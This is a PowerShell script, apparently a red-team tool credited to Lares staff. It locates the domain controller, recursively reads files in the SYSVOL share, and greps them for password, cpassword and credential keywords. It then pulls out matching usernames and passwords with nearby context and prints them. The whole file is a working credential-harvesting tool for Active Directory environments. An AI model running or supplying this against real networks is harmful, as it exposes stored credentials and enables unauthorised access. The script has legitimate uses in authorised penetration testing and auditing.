# LaresLLC PSScrapingKit 2023
# Neil Lines & Andy Gill
# v1.0 Release
# ----------------------------------------------------------
# Vars
$initialKeywords = @('password', 'cpassword', 'passw', 'cred', 'Password', 'Cpassword', 'Passw', 'Cred', 'Password:', 'password:', 'Password=', 'password=', 'password ', 'cpassword ', 'passw ', 'cred ', 'Password ', 'Cpassword ', 'Passw ', 'Cred ', 'Password: ', 'password: ', 'Password= ', 'password= ', 'Password : ', 'password : ', 'Password = ', 'password = ')
$additionalKeywords = @('user', 'username', 'name', 'User', 'Username', 'Name', 'Username:', 'username:', 'Username=', 'username=', 'user ', 'username ', 'name ', 'User ', 'Username ', 'Name ', 'Username: ', 'username: ', 'Username= ', 'username= ', 'Username : ', 'username : ', 'Username = ', 'username = ')
$matchesFound = $false
# ----------------------------------------------------------
# Setup and retrieve system information
$domain = $env:USERDNSDOMAIN
$domainController = ([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()).DomainControllers | Select-Object -First 1
$netlogonPath = "\\$($domainController.Name)\SYSVOL\$domain"
# ----------------------------------------------------------
# Enumerate
Get-ChildItem -Path $netlogonPath -Recurse -File | Where-Object { $_.Name -notin @('GptTmpl.inf', 'GPT.INI', 'Registry.pol') } | ForEach-Object {
  $content = Get-Content $_.FullName
  foreach ($line in $content) {
    $matches = $initialKeywords | Where-Object { $line -cmatch $_ }
    if ($matches) {
      $matchesFound = $true
      Write-Host "Match found in file $($_.FullName)!"
      $contextStart = [math]::Max(0, [array]::IndexOf($content, $line) - 3)
      $contextEnd = [math]::Min([array]::IndexOf($content, $line) + 3, $content.Count - 1)
      $context = $content[$contextStart..$contextEnd]
      $additionalKeywordsFound = $additionalKeywords | Where-Object { $context -like "*$_*" }
      $username = $line | Select-String -Pattern '(?i)username\s*[:=]\s*(.+)' -AllMatches | ForEach-Object { $_.Matches.Groups[1].Value }
      if ([string]::IsNullOrEmpty($username)) {
        $username = $context -join ' '
      }
      $password = $line | Select-String -Pattern '(?i)(?:password|passw|cred)\s*[=:]\s*(\S+)' -AllMatches | ForEach-Object { $_.Matches.Groups[1].Value }
      if ([string]::IsNullOrEmpty($password)) {
        $password = $content | Select-String -Pattern '(?i)(?:password|passw|cred)\s*[=:]\s*(\S+)' -AllMatches | ForEach-Object { $_.Matches.Groups[1].Value }
      }
      if ([string]::IsNullOrEmpty($password)) {
        $password = $line
      }
      [pscustomobject]@{
        FileName                = $_.Name
        FullName                = $_.FullName
        PrecedingContext        = $context[0..($context.IndexOf($line) - 1)]
        MatchingLine            = $line
        TrailingContext         = $context[($context.IndexOf($line) + 1)..($context.Count - 1)]
        AdditionalKeywordsFound = $additionalKeywordsFound
        Username                = $username
        Password                = $password
      }
    }
  }

  if (-not $matchesFound) {
    Write-Host "No matches found."
  }
}
